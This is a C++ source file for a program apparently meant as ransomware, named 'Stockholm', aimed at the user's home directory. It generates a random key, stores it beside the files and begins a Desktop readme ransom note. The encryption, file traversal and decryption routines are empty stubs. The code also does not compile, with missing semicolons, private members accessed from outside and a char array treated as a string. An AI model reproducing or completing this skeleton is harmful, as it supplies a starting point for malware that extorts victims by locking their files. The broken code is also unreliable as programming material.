#include <string>
#include <iostream>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h> 
#include <stdlib.h> 
#include <string.h> 
#include <sys/stat.h>

class data {
    std::string message;
    char key[28];
    std::string path;
    size_t key_size;
}

class Stockholm {
    public:
        void ransome_ware(data *d);
        void rakmanji(data *d);
    private:
        void encrypt_xor(std::string &path, data *p);
        void write_in_file(std::string &path , std::string &message);
        void generate_key(std::string &key , size_t length);
        void leave_message(data *d);
        void bad_trip(std::string &path, data *info);
}

void Stockholm::write_in_file(std::string &path , std::string &message){
    int fd = open(path.c_str(), O_CREAT | O_WRONLY, S_IRUSR | S_IWUSR);
    if(fd == -1){
        write(2,"bad trip",strlen("bad trip"));
        return;
    }
    write(fd, message.c_str(), message.size());
    close(fd);
}

void Stockholm::encrypt_xor(std::string &path, data *p){
    // encryption logic here
}

void Stockholm::generate_key(std::string &key , size_t length){
    char characters[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()__+/";
    FILE* urandom = fopen("/dev/urandom", "r");
    if (urandom == NULL) {
        fprintf(stderr, "Failed to open /dev/urandom\n");
        exit(1);
    }
    key.clear();
    for (size_t i = 0; i < length; i++) {
        unsigned char random_value;
        fread(&random_value, sizeof(random_value), 1, urandom);
        key += characters[random_value % (sizeof(characters) - 1)];
    }
    key += '\0';
    fclose(urandom);
}

void Stockholm::leave_message(data *d){
    std::string path = d->path + "/" + " ";
    int fd = open(path.c_str(), O_CREAT | O_WRONLY, S_IRUSR | S_IWUSR);
    if(fd == -1){
        write(2,"bad trip",strlen("bad trip"));
        return;
    }
    write(fd, d->key.c_str(), d->key.size());
    close(fd);
    std::string readme_path = d->path + "/Desktop/readme.txt";

}

void Stockholm::bad_trip(std::string &path, data *info){

}

void Stockholm::ransome_ware(data *d){
    generate_key(d->key, d->key_size);
    bad_trip(d->path, d);
    leave_message(d);

}
int main(int ac , char **av){
    if (!av[1]){
        std::cout << "This program will encrypt your files in the specified path. try -h for instructions" << std::endl;
        return 1;
    } else if(av[1] == std::string("-h")){
        std::cout << "This program will encrypt your files in the specified path." << std::endl;
        std::cout << "Usage:" << av[0] << "-option <path> (default == $home)" << std::endl;
        std::cout << "Examples: "  << std::endl;
        std::cout << "Decryption" << av[0] << "-d <path> <key>" << std::endl;
        std::cout << "Encryption" << av[0] << "-e <path>" << std::endl;
        return 0;
    }else if(av[1] == std::string("-e")){
        data p;
        p.key_size = 28;
        if(av[2]){
            p.path = av[2];
        } else {
            p.path = getenv("HOME");
        }
        Stockholm stockholm;
        stockholm.ransome_ware(&p);
    }else if(av[1] == std::string("-d")){
        // decryption part
    }
}